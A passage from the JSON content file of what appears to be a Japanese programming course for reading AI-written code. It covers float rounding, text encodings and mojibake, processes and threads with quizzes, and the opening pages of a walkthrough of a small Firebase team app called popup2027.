`\"0.1\"` から作ります。\n\n## 四捨五入も思いどおりにならない\n\n```python\nround(2.5)       # 2   ← 3 ではない！\nround(3.5)       # 4\nround(0.125, 2)  # 0.12\n```\n\n```javascript\nMath.round(2.5)      // 3\nMath.round(-2.5)     // -2\n(1.005).toFixed(2)   // \"1.00\"  ← 1.01 ではない\n```\n\n（すべて実行して確認した結果です）\n\n| 何が起きているか | 説明 |\n|---|---|\n| Python の `round(2.5)` が 2 | 「ちょうど半分なら偶数のほうへ丸める」方式（銀行家の丸め）。誤差がたまりにくい |\n| `(1.005).toFixed(2)` が `\"1.00\"` | 1.005 が実際には 1.00499999… として覚えられているため |\n| JavaScript の `Math.round(-2.5)` が -2 | 「大きいほうへ」丸めるので、マイナスでは 0 に近づく |\n\n学校で習う「四捨五入」が必要なら、Python では `Decimal` の `quantize(..., rounding=ROUND_HALF_UP)` を使います。\n**税込み価格の計算など、1 円のずれが問題になる場面** では、AI のコードがどの丸め方を使っているかを必ず確認しましょう。\n\n## 整数の大きさ：Python は無限、JavaScript は限界あり\n\n```python\nprint(2 ** 64)     # 18446744073709551616   Python の整数はいくらでも大きくできる\n```\n\n```javascript\nconsole.log(Number.MAX_SAFE_INTEGER)   // 9007199254740991（約 9000 兆）\nconsole.log(9007199254740993)          // 9007199254740992  ← 1 ずれた！\nconsole.log(9007199254740993n)         // 9007199254740993n ← BigInt なら正確\n```\n\nJavaScript の普通の数（`Number`）は、中身が小数（float）なので、約 9000 兆を超えると **整数でもずれます**。\n\n⚠️ これが実際に問題になるのは **ID** です。X（旧 Twitter）や Discord の ID は 19 桁ほどあり、JSON の数値のまま JavaScript で読むと、下の桁が変わって別の ID になります。そのため、多くの API は ID を **文字列** `\"1234567890123456789\"` で返します。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `price * 1.1` で税込み計算 | ⚠️ 誤差と丸め方。整数や `Decimal` にしているか |\n| `if total == 0.3:` | ⚠️ 小数を `==` で比べている。`math.isclose` か整数に |\n| `round(x)` で四捨五入のつもり | ⚠️ Python は偶数への丸め。必要なら `ROUND_HALF_UP` |\n| JavaScript で `JSON.parse` した大きな ID | ⚠️ 数値のままだとずれる。文字列で受け取っているか |\n| `Decimal(\"19.99\")` / 金額を整数のセントで保存 | ✅ |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Python で `0.1 + 0.2 == 0.3` が `False` になる理由は？",
        "choices": [
         "Python のバグ",
         "2 進数では 0.1 などを正確に表せず、わずかな誤差があるから",
         "足し算の順番が決まっていないから"
        ],
        "answer": 1,
        "explain": "0.1 は 2 進数で無限に続く小数になるため、決まった桁数で切ったずれた値を覚えています。ほぼすべての言語で同じです。"
       },
       {
        "question": "お金の計算の方法として適切なのは？",
        "choices": [
         "`float` で計算し、最後に `round` する",
         "円やセントの整数で持つか、文字列から作った `Decimal` を使う",
         "`Decimal(0.1)` のように float から Decimal を作る"
        ],
        "answer": 1,
        "explain": "整数で持てば誤差はありません。Decimal は必ず文字列から作ります（float から作ると誤差ごと入ります）。"
       },
       {
        "question": "JavaScript で 19 桁の ID を数値のまま扱うと、何が起きうる？",
        "choices": [
         "自動で BigInt に変換される",
         "エラーで止まる",
         "エラーは出ずに、下の桁が変わって別の値になる"
        ],
        "answer": 2,
        "explain": "約 9000 兆（`Number.MAX_SAFE_INTEGER`）を超えると整数でも正確に表せません。エラーが出ないので気づきにくいのが怖いところです。"
       }
      ]
     ],
     "id": "04-numbers-float"
    },
    {
     "title": "文字コードと文字化け ― UTF-8 と Shift_JIS",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "encoding",
      "strings",
      "io"
     ],
     "summary": "文字を数（バイト）に変える約束が文字コード。文字化けが起きる仕組みと、Windows・Excel・CSV でよくあるトラブルの直し方。",
     "body": "## このレッスンのゴール\n\n- 文字コードとは何か、UTF-8 と Shift_JIS（cp932）の違いを説明できる\n- 文字化けを見て、だいたいの原因を推測できる\n- `encoding=\"utf-8\"`・`utf-8-sig`・`UnicodeDecodeError` が出てくるコードを読める\n\n## 文字コード ＝ 文字と数の対応表\n\nコンピュータは数しか扱えない（レッスン 2）ので、文字にも番号を付けます。\n\n```python\nord(\"A\")    # 65\nchr(65)     # 'A'\nord(\"あ\")   # 12354（16 進数で 0x3042）\n```\n\n世界中の文字に 1 つずつ番号を付けた表が **Unicode** です。「あ」は U+3042 番です。\nただし、番号を **ファイルに保存するときのバイトの並べ方** には何種類かあり、これを **文字コード（エンコーディング）** と呼びます。\n\n| 文字コード | 「あ」のバイト | 特徴 |\n|---|---|---|\n| **UTF-8** | `e3 81 82`（3 バイト） | 世界標準。Web・Mac・Linux・Python・Git の標準 |\n| **Shift_JIS**（Windows では **cp932**） | `82 a0`（2 バイト） | 日本の昔からの文字コード。古い Windows アプリや Excel の CSV で今も使われる |\n| ASCII | 無し（英数字だけ） | 英数字と記号だけの 128 文字。UTF-8 の英数字部分と同じ |\n\n```python\n\"abc\".encode()             # 3 バイト（英数字は 1 文字 1 バイト）\n\"あ\".encode()              # b'\\xe3\\x81\\x82'（UTF-8 で 3 バイト）\n\"あ\".encode(\"cp932\")       # 2 バイト\n\"😀\".encode()              # 4 バイト（絵文字は 4 バイト）\n```\n\n- **encode**（エンコード）：文字列 → バイト。保存・送信するとき\n- **decode**（デコード）：バイト → 文字列。読み込むとき\n\n## 文字化けの正体\n\n**書いたときと違う文字コードで読む** と、文字化けします。\n\n```python\n\"こんにちは\".encode(\"utf-8\").decode(\"cp932\")\n# '縺薙ｓ縺ｫ縺｡縺ｯ'          ← UTF-8 で書いたものを Shift_JIS で読んだ\n\n\"こんにちは\".encode(\"cp932\").decode(\"utf-8\")\n# UnicodeDecodeError: 'utf-8' codec can't decode byte 0x82 in position 0: invalid start byte\n\n\"文字化け\".encode(\"utf-8\").decode(\"latin-1\")\n# 'æ\\x96\\x87å\\xad\\x97...'   ← UTF-8 を西欧の文字コードで読んだ\n```\n\n（すべて実行して確認しました）\n\n### 化け方で原因が分かる\n\n| 見え方 | よくある原因 |\n|---|---|\n| `縺薙ｓ縺ｫ…`（「縺」がたくさん） | **UTF-8** のファイルを **Shift_JIS** で開いた（Windows のメモ帳の古い版・Excel） |\n| `�` や `?` だらけ | 読めないバイトを置き換えた（`errors=\"replace\"`）。そもそも文字コードが違う |\n| `ã“ã‚“…`・`æ–‡å­—` | UTF-8 を西欧の文字コード（latin-1 など）で読んだ |\n| `UnicodeDecodeError: 'utf-8' codec can't decode byte 0x82` | **Shift_JIS** のファイルを UTF-8 で読もうとした（0x82 は Shift_JIS のひらがなによく出るバイト） |\n\n## Windows でよくあるトラブル\n\n### ① `open()` で `encoding` を書かない\n\n```python\nopen(\"memo.txt\").read()                     # ⚠️ OS によって読み方が変わる\nopen(\"memo.txt\", encoding=\"utf-8\").read()   # ✅ いつも UTF-8\n```\n\n`encoding` を省略すると、**OS の標準の文字コード** で読みます。Mac・Linux は UTF-8 ですが、日本語の Windows では cp932 になることがあり、Mac で動いたコードが Windows で `UnicodeDecodeError` になります（Python 3.15 で標準を UTF-8 にする変更が入りますが、それより古い Python もまだ多く使われています）。\n**テキストファイルを開くときは、`encoding=\"utf-8\"` を必ず書く** のが安全です。\n\n### ② Excel で CSV を開くと文字化けする\n\nExcel は、目印の無い CSV を Shift_JIS だと思って開きます。そこで、ファイルの先頭に **BOM**（「これは UTF-8 です」という 3 バイトの目印 `ef bb bf`）を付けます。\n\n```python\nimport csv\nwith open(\"out.csv\", \"w\", encoding=\"utf-8-sig\", newline=\"\") as f:   # utf-8-sig = BOM 付き UTF-8\n    csv.writer(f).writerows([[\"名前\", \"金額\"], [\"りんご\", 120]])\n```\n\n逆に、BOM 付きのファイルを普通の `utf-8` で読むと、最初の列名の前に見えない文字 `﻿` が付いて、`row[\"id\"]` が見つからない（`KeyError`）といったことが起きます。読むときも `utf-8-sig` にすると、BOM があってもなくても読めます。\n\n### ③ Shift_JIS のファイルを読む\n\n```python\nopen(\"old.csv\", encoding=\"cp932\").read()\n```\n\n`shift_jis` より `cp932` のほうが安全です。cp932 は Windows 独自の文字（`①`・`髙` など）も読めますが、`shift_jis` だと `UnicodeEncodeError` などになります（`\"①髙\".encode(\"shift_jis\")` がエラーになることを確認しました）。\n\n## 文字数とバイト数は違う\n\n```python\nlen(\"あ\")            # 1（文字数）\nlen(\"あ\".encode())   # 3（バイト数）\nlen(\"😀\")            # 1\n```\n\n```javascript\n\"あ\".length          // 1\n\"😀\".length          // 2   ← JavaScript は 1 になるとは限らない\n[...\"😀\"].length     // 1\n```\n\nJavaScript の `.length` は、絵文字などを 2 と数えることがあります。「20 文字まで」の入力チェックや、データベースの「100 バイトまで」の列で、思ったより早く上限に届くのはこのためです。\n\n## AI のコードではこう出てくる\n\n| 書き方 | チェック |\n|---|---|\n| `open(path)`（`encoding` 無し） | ⚠️ Windows で化ける可能性。`encoding=\"utf-8\"` を |\n| `encoding=\"utf-8-sig\"` | ✅ Excel 向けの CSV、または BOM 付きでも読めるように |\n| `encoding=\"cp932\"` | 古い Windows のファイルや、日本の銀行・役所の CSV を読んでいる |\n| `errors=\"ignore\"` / `errors=\"replace\"` | ⚠️ 読めない文字を **黙って消す／置き換える**。データが欠けても気づけない |\n| `requests` の `resp.text` が化ける | `resp.encoding = \"utf-8\"` を設定するか、`resp.content.decode(...)` |\n| HTML の `<meta charset=\"utf-8\">` | ✅ ブラウザに文字コードを伝えている |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "画面に「縺薙ｓ縺ｫ縺｡縺ｯ」と表示された。いちばん考えられる原因は？",
        "choices": [
         "UTF-8 で保存されたものを Shift_JIS として読んだ",
         "Shift_JIS で保存されたものを UTF-8 として読んだ",
         "ファイルが壊れている"
        ],
        "answer": 0,
        "explain": "「縺」が並ぶのは、UTF-8 の日本語を Shift_JIS（cp932）で読んだときの典型的な化け方です。"
       },
       {
        "question": "Python で作った CSV を Excel で開くと文字化けする。直し方として適切なのは？",
        "choices": [
         "`encoding=\"ascii\"` で書く",
         "`encoding=\"utf-8-sig\"`（BOM 付き UTF-8）で書く",
         "`errors=\"ignore\"` を付ける"
        ],
        "answer": 1,
        "explain": "Excel は BOM という目印があると UTF-8 として開きます。`utf-8-sig` で書くと BOM が付きます。"
       },
       {
        "question": "`open(\"data.txt\").read()` が Mac では動いたのに、Windows で `UnicodeDecodeError` になった。理由は？",
        "choices": [
         "Windows では `open` が使えない",
         "ファイルが大きすぎる",
         "`encoding` を省略すると OS の標準の文字コードで読むため、Windows では UTF-8 以外で読もうとした"
        ],
        "answer": 2,
        "explain": "省略時の文字コードは OS によって違います。`encoding=\"utf-8\"` を明示すれば、どこでも同じように読めます。"
       }
      ]
     ],
     "id": "05-encoding"
    },
    {
     "title": "プロセスとスレッド ― 同時に動くプログラム",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "hardware",
      "async",
      "performance"
     ],
     "summary": "実行中のプログラム（プロセス）と、その中の作業の流れ（スレッド）。「ポートが使用中」「Ctrl+C」「同時に書き換えて数がずれる」の正体。",
     "body": "## このレッスンのゴール\n\n- プログラム・プロセス・スレッドの違いを説明できる\n- `Address already in use` や「プロセスを終了する」の意味が分かる\n- スレッドを使う AI のコードで、データの取り合い（競合）に気づける\n\n## プログラムとプロセス\n\n| | たとえ | 説明 |\n|---|---|---|\n| **プログラム** | レシピ本 | ストレージに保存されたファイル（`main.py`、`chrome.exe`） |\n| **プロセス** | 実際に料理している台所 | プログラムを **実行している最中のもの**。メモリの一部をもらって動く |\n| **スレッド** | 台所で働く料理人 | プロセスの中で、命令を順番に実行していく流れ。1 つのプロセスに 1 人以上いる |\n\n同じプログラムでも、2 回起動すれば **プロセスは 2 つ** になります（ブラウザのウィンドウを 2 つ開くなど）。\nOS は、それぞれのプロセスに **番号（PID）** と **専用のメモリ** を割り当てます。あるプロセスが他のプロセスのメモリを勝手に読んだり壊したりできないようになっています。\n\n```python\nimport os\nprint(os.getpid())       # 1293 などの PID（実行するたびに変わる）\nprint(os.cpu_count())    # CPU のコア（同時に計算できる数）。この環境では 4\n```\n\n### プロセスを見る・止める\n\n| やりたいこと | Windows | Mac / Linux |\n|---|---|---|\n| 一覧を見る | タスクマネージャー（Ctrl+Shift+Esc） | アクティビティモニタ／`ps`・`top` |\n| 実行中のプログラムを止める | ターミナルで **Ctrl+C** | ターミナルで **Ctrl+C** |\n| 番号を指定して止める | `taskkill /PID 1234` | `kill 1234` |\n\n`npm run dev` や `uvicorn` で起動したサーバーが、ターミナルを占領したまま戻ってこないのは、**プロセスが動き続けている** からです。Ctrl+C で止めます。\n\n## 「ポートがすでに使われています」\n\n```text\nOSError: [Errno 98] Address already in use\nError: listen EADDRINUSE: address already in use :::3000\n```\n\n（上は、同じポートを 2 回使おうとして実際に出したエラーです）\n\n1 つのポート（バックエンドコースのレッスン 2 の「部屋番号」）は、**1 つのプロセスしか使えません**。\nこのエラーのほとんどは、**前に起動したサーバーがまだ動いている** のが原因です。\n\n- 前のターミナルで Ctrl+C を押し忘れていないか確認する\n- 見つからなければ、そのポートを使っているプロセスを探して止める（Windows：`netstat -ano | findstr :3000`、Mac/Linux：`lsof -i :3000`）\n- または、別のポートで起動する（`--port 8001`）\n\n## スレッド：1 つのプロセスの中で同時に進める\n\n待ち時間の多い仕事（ダウンロード・API の呼び出し）は、料理人を増やすと速くなります。\n\n```python\nimport time\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef wait(n):\n    time.sleep(1)          # 1 秒かかる通信の代わり\n    return n\n\nfor i in range(4):         # 順番に：約 4.0 秒\n    wait(i)\n\nwith ThreadPoolExecutor(4) as ex:            # 4 つのスレッドで：約 1.0 秒\n    print(list(ex.map(wait, range(4))))      # [0, 1, 2, 3]\n```\n\n（実際に測った時間です）\n\n## スレッドの落とし穴：同じデータの取り合い\n\nスレッドどうしは **同じメモリ（変数）を共有** します。これは便利な反面、危険でもあります。\n\n```python\nimport threading, time\n\ncounter = 0\ndef add():\n    global counter\n    for _ in range(1000):\n        v = counter          # ① 今の値を読む\n        time.sleep(0)        #    （ここで他のスレッドに順番が回りやすくする）\n        counter = v + 1      # ② 1 足して書き戻す\n\nthreads = [threading.Thread(target=add) for _ in range(4)]\nfor t in threads: t.start()\nfor t in threads: t.join()\nprint(counter)               # 4000 になるはずが… 1002（実行した結果）\n```\n\n2 つのスレッドが **同じ値を読んでから**、それぞれ 1 足して書き戻すと、2 回足したのに 1 しか増えません。これを **競合状態（レースコンディション）** と呼びます。\nタイミング次第で起きたり起きなかったりするので、**テストでは見つかりにくい** のが厄介なところです。\n\n### 直し方：ロック（鍵）を使う\n\n```python\nlock = threading.Lock()\ndef add():\n    global counter\n    for _ in range(1000):\n        with lock:           # 鍵を持っている 1 人だけが中に入れる\n            counter += 1\n```\n\n同じことは、Web サーバーで 2 人が同時に「残り 1 個の商品」を買うときにも起きます。データベースでは **トランザクション**（データベース設計のコース）で防ぎます。\n\n## プロセス・スレッド・async の使い分け\n\n| 方法 | Python | 向いている仕事 |\n|---|---|---|\n| **複数のプロセス** | `multiprocessing`、`ProcessPoolExecutor` | 計算が重い（画像処理・大量の計算）。CPU のコアを全部使える |\n| **複数のスレッド** | `threading`、`ThreadPoolExecutor` | 待ち時間が多い（通信・ファイル） |\n| **async / await** | `asyncio`（Python コースのレッスン 13） | 待ち時間が多い。1 つのスレッドで大量の通信をさばく |\n\nPython には **GIL** という仕組みがあり、普通の Python ではスレッドを増やしても **計算そのものは同時に 1 つしか進みません**（Python 3.13 から GIL を外した版も試験的に提供されています）。\nそのため「重い計算はプロセス、待ちが多い仕事はスレッドか async」と使い分けます。\n\nJavaScript は基本的に **1 つのスレッド** で動き、待ち時間は `async` / `await`（Promise）で処理します。重い計算は Web Worker や Node.js の `worker_threads` で別のスレッドに回します。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `threading.Thread` / `ThreadPoolExecutor` で共有の変数やリストを書き換えている | ⚠️ ロックがあるか。結果を `return` で集める形のほうが安全 |\n| `ProcessPoolExecutor` | 重い計算を CPU のコアに分けている。`if __name__ == \"__main__\":` が必要（Windows では特に） |\n| `Address already in use` / `EADDRINUSE` | 前のサーバーが動いたまま。Ctrl+C か、プロセスを止める |\n| `kill -9` / `taskkill /F` | 強制終了。保存処理が途中で止まる可能性がある |\n| 「在庫を読む → 減らして書く」を 2 回に分けている | ⚠️ 同時に買われると在庫がずれる。データベースで 1 回の更新にするか、トランザクションに |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "同じプログラムを 2 回起動すると、プロセスはいくつになる？",
        "choices": [
         "1 つ（同じプログラムなので共有される）",
         "2 つ（それぞれ別の PID とメモリを持つ）",
         "0 個（2 回目は起動できない）"
        ],
        "answer": 1,
        "explain": "プロセスは「実行中のもの」なので、起動した回数だけできます。"
       },
       {
        "question": "`npm run dev` で `EADDRINUSE: address already in use :::3000` と出た。まず確認することは？",
        "choices": [
         "Node.js を入れ直す",
         "前に起動したサーバーが別のターミナルで動いたままになっていないか",
         "パソコンのメモリを増やす"
        ],
        "answer": 1,
        "explain": "1 つのポートは 1 つのプロセスしか使えません。前のサーバーを Ctrl+C で止めるか、別のポートで起動します。"
       },
       {
        "question": "4 つのスレッドで共有の変数 `counter` に 1000 回ずつ足したのに、4000 より小さくなった。原因は？",
        "choices": [
         "スレッドは足し算ができない",
         "Python の整数に上限があるから",
         "複数のスレッドが同じ値を読んでから書き戻したため、足した分が消えた（競合状態）"
        ],
        "answer": 2,
        "explain": "「読む → 足す → 書く」の間に他のスレッドが割り込むと、更新が失われます。ロックで 1 人ずつにするか、共有の値を書き換えない作りにします。"
       }
      ]
     ],
     "id": "06-process-thread"
    }
   ],
   "status": "open"
  }
 ],
 "explanations": [
  {
   "title": "popup2027 の全体像 ― チームでポップアップを準備する共有アプリ",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 2,
   "series": "popup2027",
   "part": 1,
   "concepts": [
    "reading",
    "dom_ui",
    "database",
    "async"
   ],
   "lessons": [
    "00-basics/02-how-to-read-code",
    "20-javascript/06-dom-events",
    "20-javascript/07-promise-async",
    "100-ai-dev/06-secrets-env"
   ],
   "summary": "2027 年のポップアップに向けて、メンバーでタスク・予定・ログ・アイデア・お金を共有する、1 ファイルだけでできた Web アプリの全体像。",
   "body": "> 📚 このページは **popup2027 シリーズの 1 ページ目（全体像）** です。ファイルは `index.html` の 1 つだけですが、中を 7 つの部分に分けて、2 ページ目から順番に読んでいきます。\n\n## 📄 解説するコード（ファイルと中身の地図）\n\n```text\npopup2027/\n├── .nojekyll        GitHub Pages で公開するための目印（中身は空）\n└── index.html       アプリのすべて（406 行）\n    ├── 1〜93 行     HTML の骨組み と CSS（見た目）                     → 2 ページ目\n    └── <script>     JavaScript（動き）\n        ├── 96〜143 行   データ層：Firebase / お試しモード              → 3 ページ目\n        ├── 145〜163 行  状態（S）と便利な小道具                         → 4 ページ目\n        ├── 165〜249 行  描画：ホーム・タスク・予定・ログの画面          → 5 ページ目\n        ├── 251〜291 行  描画：アイデア（いいね）・お金（精算）の画面    → 6 ページ目\n        ├── 293〜360 行  モーダルとイベント（クリック・送信）            → 7 ページ目\n        └── 362〜403 行  写真の縮小 と リアルタイム更新                  → 8 ページ目\n```\n\n## 🧭 ひとことで言うと\n\n**HTML・CSS・JavaScript** で書かれた、**2027 年のポップアップ（期間限定のお店・イベント）をメンバーで準備するための共有アプリ** です。\nタスク・予定・活動ログ・アイデア・立て替えたお金を記録でき、**Firebase**（Google のクラウドのデータベース）につながっているので、誰かが書き込むと他のメンバーの画面にもすぐ反映されます。\n\n## 🗺️ 全体の流れ\n\n1. ブラウザで `index.html` を開く（GitHub Pages で公開されている想定）\n2. Firebase に接続し、データ（タスクなど 5 種類と設定）を **「見張る（購読する）」** 状態にする\n3. 初めての人には「あなたは誰？」と名前を選んでもらう（この端末に記憶）\n4. 画面下のタブ（ホーム・タスク・予定・ログ・アイデア・お金）で表示を切り替える\n5. フォームで追加・ボタンで変更すると、Firebase に書き込まれる\n6. Firebase から「データが変わった」と知らせが来ると、画面全体を描き直す（自分の変更も、他の人の変更も同じ流れ）\n\n## 🔍 ブロックごとの解説\n\n### 6 つの画面\n\n| タブ | できること |\n|---|---|\n| 🏠 ホーム | 本番までのカウントダウン、タスクの進み具合、自分のやること、次の予定、最近のログ |\n| ✅ タスク | やることの追加、担当者・締め切り、未着手 → 進行中 → 完了 の切り替え |\n| 📅 予定 | マイルストーン（節目の予定）を日付順に。過ぎた予定は色が変わる |\n| 📝 ログ | 「今日やったこと・決まったこと」の記録 |\n| 💡 アイデア | 思いつきや写真の投稿、♥（いいね）。いいねの多い順に並ぶ |\n| 💰 お金 | 立て替えた支出の記録と、1 人あたりの精算額の自動計算 |\n\n### 1 ファイルにすべて入れる作り\n\nfashion_news（Python）は役割ごとにファイルを分けていましたが、こちらは **HTML・CSS・JavaScript を 1 つのファイルに全部入れて** います。\n\n- 良い点：サーバーもビルドも要らず、ファイルを置くだけで公開できる\n- 悪い点：長くなると読みにくい。だからこのシリーズでは、コメント `// ---------- 描画 ----------` などの区切りごとに分けて読みます\n\n### データの置き場所は 2 通り\n\n- **Firebase モード**：クラウドのデータベースに保存。メンバー全員で共有できる（本番はこちら）\n- **お試しモード**：Firebase の設定が無いときは、この端末のブラウザ（localStorage）だけに保存\n\n画面を描く側は「どちらに保存されているか」を気にしなくて済むように作られています（3 ページ目）。\n\n### 「状態 → 画面」の一方通行\n\nこの作り方の中心にある考え方です。\n\n```text\nデータ（S）が変わる → render() で画面を全部描き直す\n```\n\nボタンを押しても画面を直接いじらず、**データを変える → 知らせが来る → 描き直す** の順に流れます。React などのフレームワークと同じ考え方を、自分の手で小さく実装しています。\n\n## 🐍 Python と比べると\n\n| popup2027 | Python で言うと |\n|---|---|\n| `index.html` 1 ファイル | `app.py` 1 ファイルに全部書いたスクリプト |\n| Firebase（クラウドのデータベース） | サーバー上のデータベース。Python なら `firebase_admin` ライブラリで同じデータを読める |\n| `S`（状態をまとめたオブジェクト） | 状態をまとめた辞書 `S = {\"tab\": \"home\", ...}` |\n| `VIEWS.tasks()` が HTML の文字列を返す | 関数が f-string で文字列を組み立てて返すのと同じ |\n\n## 🔑 キーワード\n\n- **Firebase / Firestore**：Google のクラウドサービスと、その中のデータベース\n- **リアルタイム同期**：誰かがデータを変えると、他の人の画面にもすぐ反映されること\n- **購読（subscribe）**：データを「見張って」、変わったら知らせてもらうこと\n- **localStorage**：ブラウザの中に小さなデータを保存しておける場所\n- **シングルページアプリ（SPA）**：1 つのページの中で画面を切り替えるアプリ\n- **GitHub Pages**：GitHub のリポジトリをそのまま Web サイトとして公開する仕組み\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ サーバー不要・ファイル 1 つで動き、データはリアルタイムで共有される。小さなチーム用としてよくできている\n- ✅ ユーザーが入力した文字は `esc()` で無害化してから画面に出している\n- ✅ Firebase が無くても「お試しモード」で動く\n- ⚠️ **ログインの仕組みが無い**。「あなたは誰？」は名前を選ぶだけで、本人確認ではない。リポジトリも公開されているので、**データを守れるかは Firestore の「セキュリティルール」次第**（ルールがゆるいと、URL を知った誰でも読み書き・削除できる）。Firebase のコンソールでルールを確認したい\n- ⚠️ メンバーは設定画面で名前を変えられるが、**人数（3 人）は増やせない**作りになっている\n- ⚠️ 写真をデータベースの中に文字列として保存しているので、写真が多いと読み込みが重くなる（8 ページ目）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「これは 2027 年のポップアップに向けて、メンバーで準備を共有するための Web アプリです。HTML 1 ファイルだけでできていて、タスク・予定・ログ・アイデア・お金の 5 種類のデータを Firebase のデータベースに保存しています。\nデータを購読しているので、誰かが書き込むと全員の画面がすぐ更新されます。お金のタブでは立て替えを記録すると、誰がいくら払えばいいかを自動で計算してくれます。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "メンバーの誰かがタスクを追加すると、他のメンバーの画面はどうなる？",
      "choices": [
       "再読み込みするまで変わらない",
       "Firebase から知らせが来て、自動で描き直される",
       "次の日に反映される"
      ],
      "answer": 1,
      "explain": "データを購読（onSnapshot）しているので、変更がすぐに届きます。"
     },
     {
      "question": "Firebase の設定が無いときはどうなる？",
      "choices": [
       "お試しモードになり、この端末のブラウザだけに保存される",
       "アプリが動かない",
       "GitHub にデータが保存される"
      ],
      "answer": 0,
      "explain": "画面上部に「お試しモード」と表示されます。"
     },
     {
      "question": "このアプリでデータを守る上で特に大事なのは？",
      "choices": [
       "「あなたは誰？」で名前を選ぶこと",
       "Firebase（Firestore）のセキュリティルールの設定",
       "ファイルを 1 つにまとめること"
      ],
      "answer": 1,
      "explain": "名前の選択は本人確認ではないため、誰が読み書きできるかはデータベース側のルールで決まります。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-01-overview"
  },
  {
   "title": "HTML の骨組みと CSS ― 画面の「入れ物」と見た目",
   "language": "HTML/CSS",
   "date": "2026-11-17",
   "level": 1,
   "series": "popup2027",
   "part": 2,
   "concepts": [
    "dom_ui"
   ],
   "lessons": [
    "20-javascript/06-dom-events",
    "00-basics/01-what-is-a-program"
   ],
   "summary": "アプリの入れ物になる HTML（4 つの空の箱）と、色をまとめて管理する CSS 変数・ダークモード対応。",
   "body": "## 📄 解説するコード（1〜93 行目・抜粋）\n\n```html\n<!doctype html>\n<html lang=\"ja\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1,viewport-fit=cover\">\n<title>POP UP 2027</title>\n<link href=\"https://fonts.googleapis.com/css2?family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap\" rel=\"stylesheet\">\n<style>\n:root{\n  --bg:#f6f3ee; --card:#ffffff; --ink:#1f1d1a; --sub:#77716a; --line:#e6e0d7;\n  --accent:#e2553f; --accent-soft:#fbe4df; --ok:#2f8f5b; --ok-soft:#dff1e6; --warn:#c98a12; --warn-soft:#faefd7;\n  --radius:14px;\n}\n@media (prefers-color-scheme: dark){\n  :root{ --bg:#171614; --card:#22201d; --ink:#f2eee8; /* …略… */ }\n}\nbody{background:var(--bg);color:var(--ink);font-family:\"Zen Kaku Gothic New\",system-ui,sans-serif;padding-bottom:84px}\n.card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:16px;margin-bottom:12px}\n.s-todo{background:var(--line);color:var(--sub)}\n.s-doing{background:var(--warn-soft);color:var(--warn)}\n.s-done{background:var(--ok-soft);color:var(--ok)}\nnav{position:fixed;left:0;right:0;bottom:0;background:var(--card);border-top:1px solid var(--line);display:flex;justify-content:center;padding-bottom:env(safe-area-inset-bottom)}\n.modal{position:fixed;inset:0;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;padding:16px;z-index:10}\n/* …ほか約 60 行… */\n</style>\n</head>\n<body>\n<header>\n  <h1 id=\"title\">POP UP 2027</h1>\n  <button class=\"me\" id=\"meBtn\">—</button>\n</header>\n<main id=\"main\"></main>\n<nav><div class=\"in\" id=\"nav\"></div></nav>\n<div id=\"modal\"></div>\n\n<script type=\"module\">\n  // ここから JavaScript（3 ページ目以降）\n</script>\n</body>\n</html>\n```\n\n## 🧭 ひとことで言うと\n\n**HTML** でアプリの **入れ物（空の箱）** を用意し、**CSS** で色・形・配置を決めている部分です。中身（タスクの一覧など）は後から JavaScript が箱に流し込みます。\n\n## 🗺️ 全体の流れ\n\n1. `<head>`：文字コード・スマホ対応・タイトル・フォント・CSS を読み込む\n2. `<body>`：4 つの箱（ヘッダー・メイン・下のタブ・モーダル）を置く。**ほとんど空っぽ**\n3. `<script type=\"module\">`：JavaScript が動き出し、空の箱に HTML を入れていく\n\n## 🔍 ブロックごとの解説\n\n### `<head>`：ページの設定\n\n| 行 | 意味 |\n|---|---|\n| `<meta charset=\"utf-8\">` | 日本語が文字化けしないための文字コード指定 |\n| `<meta name=\"viewport\" ...>` | スマホで見たときに、画面の幅に合わせて表示する |\n| `<link ... fonts.googleapis.com ...>` | Google Fonts から「Zen Kaku Gothic New」という日本語フォントを読み込む |\n| `<style> … </style>` | CSS（見た目のルール）をこのファイルの中に直接書いている |\n\n### `<body>`：4 つの空の箱\n\n```html\n<main id=\"main\"></main>\n<nav><div class=\"in\" id=\"nav\"></div></nav>\n<div id=\"modal\"></div>\n```\n\n`id=\"main\"` などの **名札** が付いた空の箱です。JavaScript は `document.getElementById(\"main\")` でこの箱を探し、中身を入れます（JavaScript コースの「DOM とイベント」）。\n\n| 箱 | 何が入る？ |\n|---|---|\n| `header` の `#title` / `#meBtn` | アプリのタイトルと「👤 自分の名前」ボタン |\n| `#main` | 今のタブの画面（ホーム、タスク一覧など） |\n| `#nav` | 画面下の 6 つのタブ |\n| `#modal` | 「あなたは誰？」や設定などの、上に重なる小窓 |\n\n### CSS 変数：色をまとめて管理\n\n```css\n:root{ --bg:#f6f3ee; --accent:#e2553f; ... }\nbody{ background:var(--bg); }\n```\n\n`--bg` のように `--` で始まる名前は **CSS 変数**（色などに付けた名前）です。`var(--bg)` で使います。\n色を 1 か所にまとめておくと、**変数の値を変えるだけでアプリ全体の色が変わる** ので便利です。\n\n### ダークモード対応\n\n```css\n@media (prefers-color-scheme: dark){\n  :root{ --bg:#171614; --card:#22201d; ... }\n}\n```\n\n「端末がダークモードなら、変数の値をこちらにする」という意味です。CSS 変数で作っているので、**変数を入れ替えるだけで** 画面全体が暗い配色になります。\n\n### タスクの状態ごとの色\n\n```css\n.s-todo{ ... }  .s-doing{ ... }  .s-done{ ... }\n```\n\nJavaScript 